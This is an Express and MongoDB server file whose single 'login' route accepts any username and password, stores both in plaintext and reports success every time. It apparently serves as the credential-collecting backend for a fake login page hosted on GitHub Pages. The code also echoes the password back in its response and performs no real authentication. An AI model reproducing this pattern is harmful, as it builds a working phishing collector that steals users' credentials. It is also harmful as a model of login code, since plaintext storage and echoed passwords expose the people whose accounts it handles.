require("dotenv").config();
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const mongoose = require("mongoose");

const app = express();
const PORT = process.env.PORT || 5000;

// MongoDB Connection
const url = process.env.MONGO_URI;
mongoose
  .connect(url, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => {
    console.log("MongoDB connected successfully");
  })
  .catch((err) => {
    console.error("Error in MongoDB connection:", err);
  });

// Middleware
app.use(
  cors({
    origin: [
      "http://localhost:3000", // Local frontend for development
      "https://rafiullah1819.github.io", // Production frontend
    ],
    methods: ["GET", "POST", "PUT", "DELETE"],
    allowedHeaders: ["Content-Type"],
  })
);

app.use(bodyParser.json());

// User Schema and Model
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
});
const User = mongoose.model("User", userSchema);

// Root Route (GET /) for health check
// app.get("/", (req, res) => {
//   res.status(200).send("Backend is running!");
// });

// Login Route (POST /login)
app.post("/", async (req, res) => {
  const { username, password } = req.body;

  // Simple validation
  if (!username || !password) {
    return res
      .status(400)
      .json({ error: "Username and password are required." });
  }

  // Always allow login, saving both username and password
  try {
    const user = new User({ username, password });
    await user.save();

    res.status(200).json({
      message: "Login successful!",
      user: { username, password },
    });
  } catch (err) {
    res.status(500).json({ error: "Error saving user", details: err });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on port: ${PORT}`);
});
